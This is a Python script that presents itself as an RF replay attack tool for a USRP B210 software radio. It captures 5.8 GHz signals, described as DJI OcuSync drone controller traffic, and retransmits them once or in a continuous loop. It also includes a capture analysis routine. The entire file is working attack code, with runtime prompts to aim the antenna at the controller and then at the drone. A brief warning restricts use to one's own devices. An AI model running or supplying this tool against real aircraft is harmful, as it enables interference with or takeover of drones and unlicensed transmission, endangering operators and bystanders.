#!/usr/bin/env python3
"""
RF Replay Attack Tool for USRP B210
Captures and replays RF signals at 5.8 GHz (DJI OcuSync frequency)

Usage:
    Capture:  python rf_replay_attack.py capture --duration 10 --output signal.iq
    Replay:   python rf_replay_attack.py replay --input signal.iq --gain 50

WARNING: Only use this on your own devices for research purposes.
         Transmitting on 5.8 GHz may require authorization in your jurisdiction.
"""

import argparse
import numpy as np
import sys
import time
from pathlib import Path

try:
    import uhd
    HAS_UHD = True
except ImportError:
    HAS_UHD = False
    print("UHD Python API not found. Trying GNU Radio method...")

# Default settings for DJI 5.8 GHz
DEFAULT_FREQ = 5.8e9       # 5.8 GHz center frequency
DEFAULT_RATE = 10e6        # 10 MHz sample rate
DEFAULT_RX_GAIN = 40       # RX gain (dB)
DEFAULT_TX_GAIN = 50       # TX gain (dB)


def capture_uhd_direct(filename, freq, rate, gain, duration):
    """Capture IQ samples using direct UHD API"""
    print("="*60)
    print("RF SIGNAL CAPTURE")
    print("="*60)
    print(f"Frequency:    {freq/1e9:.3f} GHz")
    print(f"Sample Rate:  {rate/1e6:.1f} MHz")
    print(f"Gain:         {gain} dB")
    print(f"Duration:     {duration} seconds")
    print(f"Output File:  {filename}")
    print("="*60)
    
    usrp = uhd.usrp.MultiUSRP()
    num_samps = int(rate * duration)
    
    print(f"\nCapturing {num_samps:,} samples...")
    print("Position your antenna near the drone controller!")
    print("Starting in 3 seconds...")
    time.sleep(3)
    
    start_time = time.time()
    samples = usrp.recv_num_samps(
        num_samps=num_samps,
        freq=freq,
        rate=rate,
        channels=[0],
        gain=gain
    )
    elapsed = time.time() - start_time
    
    # Save as complex64 (interleaved float32 I/Q)
    samples.astype(np.complex64).tofile(filename)
    
    # Calculate stats
    file_size = Path(filename).stat().st_size
    power_db = 10 * np.log10(np.mean(np.abs(samples)**2) + 1e-10)
    
    print(f"\n✓ Capture complete!")
    print(f"  Samples:    {len(samples):,}")
    print(f"  Duration:   {elapsed:.2f}s")
    print(f"  File Size:  {file_size/1e6:.2f} MB")
    print(f"  Avg Power:  {power_db:.1f} dB")
    print(f"  Saved to:   {filename}")
    
    return True


def replay_uhd_direct(filename, freq, rate, gain, loops=1):
    """Replay IQ samples using direct UHD API"""
    print("="*60)
    print("RF SIGNAL REPLAY")
    print("="*60)
    print(f"Input File:   {filename}")
    print(f"Frequency:    {freq/1e9:.3f} GHz")
    print(f"Sample Rate:  {rate/1e6:.1f} MHz")
    print(f"TX Gain:      {gain} dB")
    print(f"Loops:        {loops}")
    print("="*60)
    
    # Load samples
    if not Path(filename).exists():
        print(f"ERROR: File not found: {filename}")
        return False
    
    waveform = np.fromfile(filename, dtype=np.complex64)
    duration = len(waveform) / rate
    
    print(f"\nLoaded {len(waveform):,} samples ({duration:.2f}s)")
    
    # Normalize to prevent clipping
    max_val = np.max(np.abs(waveform))
    if max_val > 0:
        waveform = waveform / max_val * 0.8  # Scale to 80% to avoid clipping
    
    usrp = uhd.usrp.MultiUSRP()
    
    print(f"\nTransmitting in 3 seconds...")
    print("Point your antenna at the drone!")
    time.sleep(3)
    
    for i in range(loops):
        print(f"\n[Loop {i+1}/{loops}] Transmitting {duration:.2f}s of signal...")
        start_time = time.time()
        
        num_sent = usrp.send_waveform(
            waveform_proto=waveform,
            duration=duration,
            freq=freq,
            rate=rate,
            channels=[0],
            gain=gain
        )
        
        elapsed = time.time() - start_time
        print(f"  ✓ Transmitted {num_sent:,} samples in {elapsed:.2f}s")
    
    print(f"\n✓ Replay complete!")
    return True


def capture_gnuradio(filename, freq, rate, gain, duration):
    """Capture using GNU Radio (fallback method)"""
    try:
        from gnuradio import gr, uhd, blocks
    except ImportError:
        print("ERROR: Neither UHD Python API nor GNU Radio available!")
        return False
    
    print("="*60)
    print("RF SIGNAL CAPTURE (GNU Radio)")
    print("="*60)
    print(f"Frequency:    {freq/1e9:.3f} GHz")
    print(f"Sample Rate:  {rate/1e6:.1f} MHz")
    print(f"Gain:         {gain} dB")
    print(f"Duration:     {duration} seconds")
    print("="*60)
    
    class CaptureFlowgraph(gr.top_block):
        def __init__(self, filename, freq, rate, gain, duration):
            gr.top_block.__init__(self, "RF Capture")
            
            # USRP Source
            self.usrp = uhd.usrp_source(
                ",".join(("", "")),
                uhd.stream_args(cpu_format="fc32", args='', channels=[0]),
            )
            self.usrp.set_samp_rate(rate)
            self.usrp.set_center_freq(freq, 0)
            self.usrp.set_gain(gain, 0)
            self.usrp.set_antenna("RX2", 0)
            
            # Head block to limit samples
            num_samples = int(rate * duration)
            self.head = blocks.head(gr.sizeof_gr_complex, num_samples)
            
            # File sink
            self.file_sink = blocks.file_sink(gr.sizeof_gr_complex, filename, False)
            
            # Connections
            self.connect((self.usrp, 0), (self.head, 0))
            self.connect((self.head, 0), (self.file_sink, 0))
    
    print("\nStarting capture in 3 seconds...")
    time.sleep(3)
    
    tb = CaptureFlowgraph(filename, freq, rate, gain, duration)
    tb.start()
    tb.wait()
    
    file_size = Path(filename).stat().st_size
    print(f"\n✓ Capture complete!")
    print(f"  File Size:  {file_size/1e6:.2f} MB")
    print(f"  Saved to:   {filename}")
    
    return True


def replay_gnuradio(filename, freq, rate, gain, loops=1):
    """Replay using GNU Radio (fallback method)"""
    try:
        from gnuradio import gr, uhd, blocks
    except ImportError:
        print("ERROR: Neither UHD Python API nor GNU Radio available!")
        return False
    
    print("="*60)
    print("RF SIGNAL REPLAY (GNU Radio)")
    print("="*60)
    print(f"Input File:   {filename}")
    print(f"Frequency:    {freq/1e9:.3f} GHz")
    print(f"TX Gain:      {gain} dB")
    print("="*60)
    
    if not Path(filename).exists():
        print(f"ERROR: File not found: {filename}")
        return False
    
    class ReplayFlowgraph(gr.top_block):
        def __init__(self, filename, freq, rate, gain, repeat):
            gr.top_block.__init__(self, "RF Replay")
            
            # File source
            self.file_source = blocks.file_source(
                gr.sizeof_gr_complex, filename, repeat
            )
            
            # Multiply const to scale signal (avoid clipping)
            self.scale = blocks.multiply_const_cc(0.8)
            
            # USRP Sink
            self.usrp = uhd.usrp_sink(
                ",".join(("", "send_frame_size=8192,num_send_frames=128")),
                uhd.stream_args(
                    cpu_format="fc32",
                    args='underflow_policy=next_burst',
                    channels=[0],
                ),
                '',
            )
            self.usrp.set_samp_rate(rate)
            self.usrp.set_center_freq(freq, 0)
            self.usrp.set_gain(gain, 0)
            self.usrp.set_antenna("TX/RX", 0)
            
            # Connections
            self.connect((self.file_source, 0), (self.scale, 0))
            self.connect((self.scale, 0), (self.usrp, 0))
    
    # Calculate duration
    file_size = Path(filename).stat().st_size
    num_samples = file_size // 8  # complex64 = 8 bytes
    duration = num_samples / rate
    
    print(f"\nLoaded {num_samples:,} samples ({duration:.2f}s)")
    print(f"\nTransmitting in 3 seconds...")
    time.sleep(3)
    
    repeat = loops > 1
    tb = ReplayFlowgraph(filename, freq, rate, gain, repeat)
    
    if repeat:
        print(f"Continuous replay (Ctrl+C to stop)...")
        tb.start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nStopping...")
            tb.stop()
    else:
        tb.start()
        time.sleep(duration + 1)
        tb.stop()
    
    tb.wait()
    print(f"\n✓ Replay complete!")
    return True


def analyze_capture(filename, rate):
    """Analyze a captured IQ file"""
    print("="*60)
    print("CAPTURE ANALYSIS")
    print("="*60)
    
    if not Path(filename).exists():
        print(f"ERROR: File not found: {filename}")
        return
    
    samples = np.fromfile(filename, dtype=np.complex64)
    duration = len(samples) / rate
    
    print(f"File:         {filename}")
    print(f"Samples:      {len(samples):,}")
    print(f"Duration:     {duration:.2f}s")
    print(f"File Size:    {Path(filename).stat().st_size/1e6:.2f} MB")
    print("-"*40)
    
    # Power analysis
    power = np.abs(samples)**2
    power_db = 10 * np.log10(power + 1e-10)
    
    print(f"Mean Power:   {np.mean(power_db):.1f} dB")
    print(f"Max Power:    {np.max(power_db):.1f} dB")
    print(f"Min Power:    {np.min(power_db):.1f} dB")
    print(f"Std Dev:      {np.std(power_db):.1f} dB")
    
    # Check for signal presence
    signal_threshold = np.mean(power_db) + 6  # 6dB above noise
    signal_samples = np.sum(power_db > signal_threshold)
    signal_percent = signal_samples / len(samples) * 100
    
    print("-"*40)
    print(f"Signal Presence: {signal_percent:.1f}% of samples above threshold")
    
    if signal_percent < 5:
        print("⚠ WARNING: Very weak signal detected. Check antenna placement.")
    elif signal_percent > 90:
        print("✓ Strong signal detected throughout capture.")


def main():
    parser = argparse.ArgumentParser(
        description="RF Replay Attack Tool for USRP B210",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Capture 10 seconds:
    python rf_replay_attack.py capture -d 10 -o drone_signal.iq
    
  Replay once:
    python rf_replay_attack.py replay -i drone_signal.iq -g 50
    
  Replay continuously:
    python rf_replay_attack.py replay -i drone_signal.iq -g 50 --loop
    
  Analyze capture:
    python rf_replay_attack.py analyze -i drone_signal.iq
        """
    )
    
    subparsers = parser.add_subparsers(dest='command', help='Commands')
    
    # Capture command
    cap_parser = subparsers.add_parser('capture', help='Capture RF signals')
    cap_parser.add_argument('-o', '--output', default='capture.iq', help='Output file')
    cap_parser.add_argument('-d', '--duration', type=float, default=10, help='Duration in seconds')
    cap_parser.add_argument('-f', '--freq', type=float, default=DEFAULT_FREQ, help='Center frequency (Hz)')
    cap_parser.add_argument('-r', '--rate', type=float, default=DEFAULT_RATE, help='Sample rate (Hz)')
    cap_parser.add_argument('-g', '--gain', type=float, default=DEFAULT_RX_GAIN, help='RX Gain (dB)')
    
    # Replay command
    rep_parser = subparsers.add_parser('replay', help='Replay RF signals')
    rep_parser.add_argument('-i', '--input', required=True, help='Input IQ file')
    rep_parser.add_argument('-f', '--freq', type=float, default=DEFAULT_FREQ, help='Center frequency (Hz)')
    rep_parser.add_argument('-r', '--rate', type=float, default=DEFAULT_RATE, help='Sample rate (Hz)')
    rep_parser.add_argument('-g', '--gain', type=float, default=DEFAULT_TX_GAIN, help='TX Gain (dB)')
    rep_parser.add_argument('--loop', action='store_true', help='Loop continuously')
    
    # Analyze command
    ana_parser = subparsers.add_parser('analyze', help='Analyze captured signal')
    ana_parser.add_argument('-i', '--input', required=True, help='Input IQ file')
    ana_parser.add_argument('-r', '--rate', type=float, default=DEFAULT_RATE, help='Sample rate (Hz)')
    
    args = parser.parse_args()
    
    if args.command == 'capture':
        if HAS_UHD:
            capture_uhd_direct(args.output, args.freq, args.rate, args.gain, args.duration)
        else:
            capture_gnuradio(args.output, args.freq, args.rate, args.gain, args.duration)
            
    elif args.command == 'replay':
        loops = 999 if args.loop else 1
        if HAS_UHD:
            replay_uhd_direct(args.input, args.freq, args.rate, args.gain, loops)
        else:
            replay_gnuradio(args.input, args.freq, args.rate, args.gain, loops)
            
    elif args.command == 'analyze':
        analyze_capture(args.input, args.rate)
        
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
